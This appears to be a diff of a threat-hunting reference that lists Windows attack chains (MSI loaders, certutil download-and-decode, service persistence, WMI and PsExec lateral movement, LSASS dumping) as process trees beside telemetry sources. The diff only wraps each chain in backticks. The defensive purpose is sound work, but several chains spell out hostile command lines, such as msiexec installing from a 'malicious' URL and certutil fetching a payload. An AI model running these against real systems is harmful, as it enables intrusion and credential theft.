@@ -121,13 +121,14 @@ Scheduled Task logs
 
 
 # Chain 4 — MSI Loader → Rundll32 → Payload
-browser.exe / outlook.exe
+
+`browser.exe / outlook.exe
   └─ msiexec.exe /i https://malicious/payload.msi /qn
        └─ rundll32.exe malicious.dll,ExportFunc
             └─ payload.exe (stager)
                  └─ upload system info
                       └─ retrieve second-stage binary
-                           └─ C2
+                           └─ C2`
 
 
 Context / Reasoning
@@ -149,13 +150,14 @@ DeviceFileEvents: DLL written to user directories
 
 
 # Chain 5 — Certutil → Download → Decode → Execute → C2
-powershell.exe / cmd.exe
+
+`powershell.exe / cmd.exe
   └─ certutil.exe -urlcache -split -f http(s)://... payload.b64
        └─ certutil.exe -decode payload.b64 payload.exe
             └─ payload.exe
                  └─ enumerate system
                       └─ drop persistence module
-                           └─ C2 beaconing
+                           └─ C2 beaconing`
 
 
 Context / Reasoning
@@ -177,13 +179,13 @@ DeviceNetworkEvents: outbound connections
 
 
 # Chain 6 — Service-Based Persistence with sc.exe
-powershell.exe / dropper.exe
+`powershell.exe / dropper.exe
   └─ sc.exe create <svc_name> binPath="<userdir>\svc.exe" start=auto
        └─ services.exe on reboot
             └─ svc.exe
                  └─ injects credential theft module
                       └─ scans network shares
-                           └─ C2
+                           └─ C2`
 
 
 Context / Reasoning
@@ -204,11 +206,11 @@ DeviceFileEvents: svc.exe in suspicious directory
 
 
 # Chain 7 — WMI Remote Execution
-powershell.exe / script.exe
+`powershell.exe / script.exe
   └─ wmic.exe /node:<target> process call create "cmd.exe /c payload.exe"
        └─ target: cmd.exe
             └─ payload.exe
-                 └─ C2 + lateral movement staging
+                 └─ C2 + lateral movement staging`
 
 
 Context / Reasoning
@@ -229,14 +231,14 @@ DeviceNetworkEvents: RPC/DCOM traffic
 
 
 # Chain 8 — PsExec Lateral Movement → Ransomware Deployment
-malware.exe / script.ps1
+`malware.exe / script.ps1
   └─ psexec.exe \\target -s -d cmd.exe /c \\share\payload.exe
        └─ target: psexesvc.exe
             └─ cmd.exe /c \\share\payload.exe
                  └─ payload.exe
                       └─ encrypt files
                            └─ delete shadow copies
-                                └─ beacon to C2 or drop ransom note
+                                └─ beacon to C2 or drop ransom note`
 
 
 Context / Reasoning
@@ -258,14 +260,14 @@ SecurityEvent: service creation (7045)
 
 
 # Chain 9 — Fileless LOLBin → PowerShell → Rundll32 → Dllhost C2
-winword.exe
+`winword.exe
   └─ wscript.exe / mshta.exe
        └─ powershell.exe (-enc)
             └─ rundll32.exe (shellcode loader)
                  └─ dllhost.exe (injected)
                       └─ steady outbound C2
                            └─ credential harvesting commands
-                                └─ lateral movement prep
+                                └─ lateral movement prep`
 
 
 Context / Reasoning
@@ -286,12 +288,12 @@ Process ancestry from Office → script → PS → rundll32
 
 
 # Chain 10 — DLL Search Order Hijacking
-legitimate.exe
+`legitimate.exe
   └─ malicious.dll
        └─ loader inside DLL
             └─ payload.exe
                  └─ privilege escalation
-                      └─ C2 communication
+                      └─ C2 communication`
 
 
 Context / Reasoning
@@ -306,13 +308,13 @@ legitimate.exe spawning unexpected children
 
 
 # Chain 11 — Browser Exploit → PowerShell → Payload
-chrome.exe / msedge.exe
+`chrome.exe / msedge.exe
   └─ (exploit shellcode)
        └─ powershell.exe
             └─ stager.ps1
                  └─ payload.exe
                       └─ privilege escalation module
-                           └─ C2
+                           └─ C2`
 
 
 Context / Reasoning
@@ -327,13 +329,13 @@ memory anomalies in browser process
 
 
 # Chain 12 — ISO/VHD → App.exe → Malicious DLL → Payload
-explorer.exe
+`explorer.exe
   └─ mount.iso
        └─ app.exe
             └─ malicious.dll
                  └─ loader stub
                       └─ payload.exe
-                           └─ beacon + persistence
+                           └─ beacon + persistence`
 
 
 Context / Reasoning
@@ -348,13 +350,13 @@ DLL loads from same path
 
 
 # Chain 13 — LNK → LOLBin → Stager → Payload
-explorer.exe
+`explorer.exe
   └─ malicious.lnk
        └─ powershell.exe / mshta.exe
             └─ stager
                  └─ payload.exe
                       └─ registry persistence
-                           └─ C2
+                           └─ C2`
 
 
 Context / Reasoning
@@ -369,14 +371,14 @@ LOLBin spawned directly by explorer
 
 
 # Chain 14 — ZIP → JS/VBS → LOLBin → Payload
-explorer.exe
+`explorer.exe
   └─ unzip malicious.zip
        └─ wscript.exe script.js
             └─ powershell.exe
                  └─ stager
                       └─ payload.exe
                            └─ reconnaissance
-                                └─ C2
+                                └─ C2`
 
 
 Context / Reasoning
@@ -391,12 +393,12 @@ script content analysis
 
 
 # Chain 15 — Browser → CMD → PowerShell → Payload (One-Click Drive-By)
-browser.exe
+`browser.exe
   └─ cmd.exe /c (hidden window)
        └─ powershell.exe (downloadstring/encoded)
             └─ payload.exe
                  └─ persistence install
-                      └─ C2 + credential theft
+                      └─ C2 + credential theft`
 
 
 Context / Reasoning
@@ -411,13 +413,13 @@ C2 after browser event
 
 
 # Chain 16 — PowerShell → Rundll32 → dllhost Injection → C2
-powershell.exe
+`powershell.exe
   └─ rundll32.exe malicious.dll
        └─ injects into dllhost.exe
             └─ dllhost.exe
                  └─ C2 beacon
                       └─ command execution modules
-
+`
 
 Context / Reasoning
 
@@ -430,11 +432,11 @@ unexpected dllhost network traffic
 
 
 # Chain 17 — PowerShell → Inline C# → Shellcode → Memory Beacon
-powershell.exe
+`powershell.exe
   └─ reflection / Add-Type
        └─ inject shellcode into process memory
             └─ in-memory RAT
-                 └─ C2 over HTTPS
+                 └─ C2 over HTTPS`
 
 
 Context / Reasoning
@@ -449,11 +451,11 @@ PS using reflection APIs
 
 
 # Chain 18 — RDPClip → Clipboard Exfiltration
-mstsc.exe
+`mstsc.exe
   └─ rdpclip.exe
        └─ clipboard copy
             └─ memory mapped data
-                 └─ exfil via RDP session
+                 └─ exfil via RDP session`
 
 
 Context / Reasoning
@@ -468,12 +470,12 @@ remote session logs
 
 
 # Chain 19 — BYOVD → Kernel Manipulation → Payload
-dropper.exe
+`dropper.exe
   └─ install vulnerable_driver.sys
        └─ driver disables protections
             └─ payload.exe
                  └─ ransomware staging
-                      └─ C2
+                      └─ C2`
 
 
 Context / Reasoning
@@ -488,12 +490,12 @@ driver installation events
 
 
 # Chain 20 — Credential Dump → LSASS → Exfil
-malicious.exe
+`malicious.exe
   └─ read LSASS memory
        └─ generate lsass.dmp
             └─ parse credentials
                  └─ exfil via HTTPS
-                      └─ lateral movement next
+                      └─ lateral movement next`
 
 
 Context / Reasoning
